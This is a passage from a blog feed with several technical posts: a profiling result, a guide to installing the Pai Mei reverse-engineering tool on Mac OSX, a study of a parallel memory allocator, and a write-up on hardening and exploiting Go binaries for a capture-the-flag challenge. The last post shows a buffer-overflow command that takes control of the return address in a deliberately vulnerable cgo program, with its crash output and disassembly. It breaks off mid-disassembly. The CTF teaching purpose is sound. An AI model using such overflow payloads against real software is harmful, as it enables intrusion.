&lt;span class="go"&gt;     67,544,262 branch-misses             #    2.75% of all branches         [83.42%]&lt;/span&gt;

&lt;span class="go"&gt;    2.022988074 seconds time elapsed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ah, perfect! 30% faster than our original solution and significantly fewer stalled instructions.&lt;/p&gt;</summary><category term="profiling"></category></entry><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/posts/2012/10/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:posts/2012/10/pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
&lt;h3&gt;Getting the libraries&lt;/h3&gt;

&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
&lt;p&gt;Pai Mei depends on a number of packages:
&lt;ul&gt;
    &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;

&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg -&amp;gt; ../pydbg64/pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;│   ├── libmacdll.dylib&lt;/span&gt;
&lt;span class="go"&gt;│   └── ...&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Running Pai Mei&lt;/h3&gt;

&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gu"&gt;@@ -82,7 +82,7 @@ class PAIMEIapp (wx.App):&lt;/span&gt;
     &amp;#39;&amp;#39;&amp;#39;

     def OnInit (self):
&lt;span class="gd"&gt;-        wx.InitAllImageHandlers()&lt;/span&gt;
&lt;span class="gi"&gt;+#        wx.InitAllImageHandlers()&lt;/span&gt;

         splash = PAIMEIsplash()
         splash.Show()
&lt;span class="gh"&gt;diff --git a/console/support/mysql_connect_dialog.py b/console/support/mysql_connect&lt;/span&gt;
&lt;span class="gh"&gt;index 2201521..b641e37 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -104,7 +104,7 @@ class mysql_connect_dialog(wx.Dialog):&lt;/span&gt;
         self.parent.mysql_password = password

         self.mysql_connect(host, username, password)
&lt;span class="gd"&gt;-        self.Destroy()&lt;/span&gt;
&lt;span class="gi"&gt;+#       self.Destroy()&lt;/span&gt;

     def mysql_connect (self, host, username, password):
         try:
&lt;span class="gh"&gt;diff --git a/utils/process_stalker.py b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gh"&gt;index 987eec9..32206e4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -281,11 +283,15 @@ class process_stalker:&lt;/span&gt;
                                 continue

                         basic_blocks.append(bb.ea_start)

                 if last_dll: self.log(&amp;quot;Setting %d breakpoints on basic blocks in %s
                 else:        self.log(&amp;quot;Setting %d breakpoints on basic blocks in ma

&lt;span class="gd"&gt;-                self.pydbg.bp_set(basic_blocks, restore=self.restore)&lt;/span&gt;
&lt;span class="gi"&gt;+                for block in basic_blocks:&lt;/span&gt;
&lt;span class="gi"&gt;+                       self.pydbg.bp_set(block, restore=self.restore)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -166,7 +166,7 @@ class ProcessListCtrl (wx.ListCtrl, ListCtrlAutoWidthMixin, ColumnSorterMixin):&lt;/span&gt;
             heavy               = self.top.heavy.GetValue(),                \
             ignore_first_chance = self.top.ignore_first_chance.GetValue(),  \
             log                 = self.top.msg,                             \
&lt;span class="gd"&gt;-            main                = main,                                     \&lt;/span&gt;
&lt;span class="gi"&gt;+            main                = self.top.pida_modules.keys()[0],          \&lt;/span&gt;
             mysql               = self.top.main_frame.mysql,                \
             pida_modules        = self.top.pida_modules,                    \
             pydbg               = dbg,                                      \
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Analysis of a Parallel Memory Allocator</title><link href="http://codearcana.com/posts/2012/05/analysis-of-a-parallel-memory-allocator.html" rel="alternate"></link><updated>2012-05-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-11:posts/2012/05/analysis-of-a-parallel-memory-allocator.html</id><summary type="html">&lt;h1&gt;Background&lt;/h1&gt;
&lt;h2&gt;Problem&lt;/h2&gt;
&lt;p&gt;Many modern programs frequently use dynamic memory allocation. However, modern
programs increasingly are multithreaded and parallel to take advantage of
increasingly parallel processors. Unfortunately, this trend conflicts with the
fact that there is a single heap in most current programs. Consequently,
research into parallel memory allocators is topical and important.&lt;/p&gt;
&lt;h2&gt;Solution?&lt;/h2&gt;
&lt;p&gt;The simplest solution to ensuring correctness in a multithread memory allocator
is to use a global lock around the heap. Unfortunately, this has
&lt;em&gt;extremely&lt;/em&gt; negative performance consequences and is almost never 
adopted by modern memory allocators. Modern memory allocators tend to adopt 
some form of the following 3 solutions:
&lt;ul&gt;
&lt;li&gt;
They partition the heap into logical arenas or chunks that handle large 
portions of the heap. This reduces contention on the global heap and 
heap data structures.
&lt;/li&gt;
&lt;li&gt;
They use fine grained locking on individual slabs or slab classes.
&lt;/li&gt;
&lt;li&gt;
They use thread local caches to provide a fast path that requires no locks.
&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h2&gt;Modern memory allocators&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;As I understand, the most popular modern parallel mallocs are 
&lt;a href="https://www.facebook.com/notes/facebook-engineering/scalable-memory-allocation-using-jemalloc/480222803919"&gt;&lt;tt&gt;jemalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://goog-perftools.sourceforge.net/doc/tcmalloc.html"&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.malloc.de/en/"&gt;&lt;tt&gt;ptmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="https://doors.gracenote.com/developer/open.html"&gt;&lt;tt&gt;concur&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.nedprod.com/programs/portable/nedmalloc/"&gt;&lt;tt&gt;nedmalloc&lt;/tt&gt;&lt;/a&gt;
and &lt;a href="http://www.cs.umass.edu/~emery/pubs/berger-asplos2000.pdf"&gt;&lt;tt&gt;hoard&lt;/tt&gt;&lt;/a&gt;. 
Oracle did some 
&lt;a href="http://developers.sun.com/solaris/articles/multiproc/multiproc.html"&gt;investigation&lt;/a&gt; 
and I have taken a look at the internals of jemalloc, tcmalloc, concur, and hoard. 
As I understand:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt; uses a global slab allocator with thread local caches to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;hoard&lt;/tt&gt; uses different arenas and assigns superblocks to threads to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;jemalloc&lt;/tt&gt; uses different arenas and thread local caches to avoid contention
and uses red black trees and an optimized slab allocator to avoid fragmentation&lt;/li&gt;
&lt;li&gt;&lt;tt&gt;concur&lt;/tt&gt; uses different arenas and fine grained locking on size classes to avoid contention&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
One interesting characteristic of many of these memory allocators is that they
all tend to allocate memory from the system in chunks of about 1 to 4MB.
Consequently, they tend to have an overhead of up to 2 to 4MB per arena. Most
of them justify this overhead by pointing out that 2MB of overhead is minimal
when the total application footprint can exceed 1GB (in an application such as
firefox) and it is acceptable for an application to use 2MB of heap when
modern computers routinely have several GB of RAM.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
Another interesting characteristic of these memory allocators is they almost
never coallesce individual blocks (some do coallesce individual blocks). 
Instead, they use slab allocators and assume
allocation requests tend be of very similar sizes. In general, this follows
the general pattern of tolerating a moderate amount of memory overhead to
increase performance.
&lt;/p&gt;

&lt;h1&gt;Approach&lt;/h1&gt;
&lt;h2&gt;A simple modern memory allocator&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to investigate and analyze the performance of a modern memory
allocator, I wrote a simplified memory allocator, &lt;tt&gt;ar_malloc&lt;/tt&gt;, that 
uses many of the modern optimizations. &lt;tt&gt;ar_malloc&lt;/tt&gt; is based quite
heavily on &lt;tt&gt;jemalloc&lt;/tt&gt; but makes some simplifications. In order to keep 
the work manageable, &lt;tt&gt;ar_malloc&lt;/tt&gt; makes the assumption that allocation 
requests are smaller than 1024 bytes. In addition, it uses slabs of a fixed 
size and never frees memory to the system (&lt;tt&gt;jemalloc&lt;/tt&gt; uses variable sized
slabs to reduce memory overhead).
&lt;/p&gt;&lt;/p&gt;
&lt;h2&gt;Testing a memory allocator ##&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to test &lt;tt&gt;ar_malloc&lt;/tt&gt;, I constructed a test framework (based off a
test in the &lt;tt&gt;tcmalloc&lt;/tt&gt; codebase) that spawns 
several threads that each randomly decide to allocate a random sized block or 
free a random block. This does not simulate the effect of actually using the blocks
and does not simulate a realistic workload, but it is still a useful
basis for investigation. I ran this test on a 16 core shared memory system and used
new initialization of malloc for each run to reduce the variance in run time.
&lt;/p&gt;&lt;/p&gt;
&lt;h1&gt;Results&lt;/h1&gt;
&lt;h2&gt;Comparision of &lt;tt&gt;ar_malloc&lt;/tt&gt; to other solutions&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
We compared the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;, &lt;tt&gt;ar_malloc&lt;/tt&gt; with a global lock, 
and the libc malloc on the test described in the previous section.
&lt;/p&gt;
&lt;figure&gt;
&lt;img alt="Run time vs Number of threads" src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;amp;oid=4&amp;amp;zx=1aneio5en2km" /&gt;
&lt;figcaption&gt;This is chart of test run time vs number of threads for a global locked malloc, &lt;tt&gt;ar_malloc&lt;/tt&gt;, and libc malloc. As 
    you can see, the global lock solution is really bad.&lt;/figcaption&gt;
&lt;/figure&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=14&amp;zx=rgpgcr33f1ax" /&gt;
    &lt;figcaption&gt;This is chart of test run time vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; is about 3 times faster than libc for even
    single threaded execution. &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=8&amp;zx=ttz2qtfnzo60" /&gt;
    &lt;figcaption&gt;This is chart of test speedup vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; exhibits linear speedup that scales cleanly with
    the number of threads, whereas libc scales only to about 8 threads. 
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2&gt;Comparison of different configuration&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
I examined several different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;, specifically 
focusing on the number of arenas. We attempted to figure out the effect of and 
analyze the behavior of using different number of arenas.
&lt;/p&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=11&amp;zx=fwaahh94nhlg" /&gt;
&lt;figcaption&gt;This is a chart of run time vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
    As you can see, there appear to be two curves. We will call the lower one the &amp;quot;no contention&amp;quot; curve and the
    upper one the &amp;quot;contention&amp;quot; curve. You can see that the performance of a memory allocator moves from the &amp;quot;no contention&amp;quot;
    curve to the &amp;quot;contention&amp;quot; curve when the number of threads exceeds the number of arenas.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=13&amp;zx=fhdbihufrx4u" /&gt;
    &lt;figcaption&gt;
    This is a chart of speedup vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;. As you before, there are 
    two curves: the &amp;quot;no contention&amp;quot; line and the &amp;quot;contention&amp;quot; line. Again, the speedup of a memory allocator
    moves from the &amp;quot;no contention&amp;quot; line to the &amp;quot;contention&amp;quot; line when the number of threads exceeds the 
    number of arenas. It is important to note that the speedup is still mostly linear even when the number of arenas is far less
    than number of threads.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Over the course of this project, I have demonstrated that it is feasible to 
write a modern parallel memory allocator that performs quite favorably 
on random workloads. &lt;tt&gt;ar_malloc&lt;/tt&gt; makes many simplifying assumptions,
but is just over 2000 lines of code, outperforms libc malloc by a factor
of 3, and demonstrates linear speedup that seems to scale very well with
the number of threads.&lt;/p&gt;
&lt;h1&gt;Further Investigation&lt;/h1&gt;
&lt;p&gt;&lt;p&gt;
There are several routes for further investigation in parallel memory
allocators.&lt;/p&gt;
&lt;p&gt;The exisiting test framework allocates random sizes distributed
uniformly in the range 8, 1024. This almost certainly does not simulate 
realistic memory allocation patterns. An interesting further exploration could
use &lt;tt&gt;ar_malloc&lt;/tt&gt; with real programs (either via static linking or LD_PRELOAD) 
or to investigate the actual memory distribution of a general program. 
&lt;/p&gt;
&lt;p&gt;This investigation only examined the effect of different number of arenas.
A further exploration could examine the effect of thread local caches and fine
grained locking on the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
&lt;/p&gt;&lt;/p&gt;</summary><category term="malloc"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/posts/2012/05/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:posts/2012/05/securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
&lt;/p&gt;

&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;

&lt;p&gt;
Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
&lt;/ul&gt;
I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
&lt;/p&gt;

&lt;p&gt;
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
&lt;/p&gt;

&lt;p&gt;
Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
&lt;/p&gt;

&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;

&lt;h4&gt;Disclaimer&lt;/h4&gt;

&lt;p&gt;
First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
&lt;/p&gt;

&lt;p&gt;
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
&lt;/p&gt;

&lt;p&gt;
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
&lt;/p&gt;

&lt;h4&gt;The actual exploit&lt;/h4&gt;

&lt;p&gt;
The Go runtime has some really interesting properties that make it fun to exploit:
&lt;ul&gt;
    &lt;li&gt;The heap is executable.&lt;/li&gt;
    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
&lt;/ul&gt;
We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
&lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;throw: fault&lt;/span&gt;
&lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;

&lt;span class="go"&gt;goroutine 1 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32&lt;/span&gt;
&lt;span class="go"&gt;levellog.Log(0x1, 0x1883cd00, 0x7f)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140&lt;/span&gt;
&lt;span class="go"&gt;main.main()&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/build/src/webapp/main.go:21 +0x101&lt;/span&gt;

&lt;span class="go"&gt;goroutine 2 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;created by runtime.main&lt;/span&gt;
&lt;span class="go"&gt;    /usr/local/src/go/src/pkg/runtime/proc.c:221&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624e4:       e8 4f 00 00 00          call   8062538 &amp;lt;__i686.get_pc_thunk.bx&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx&lt;/span&gt;
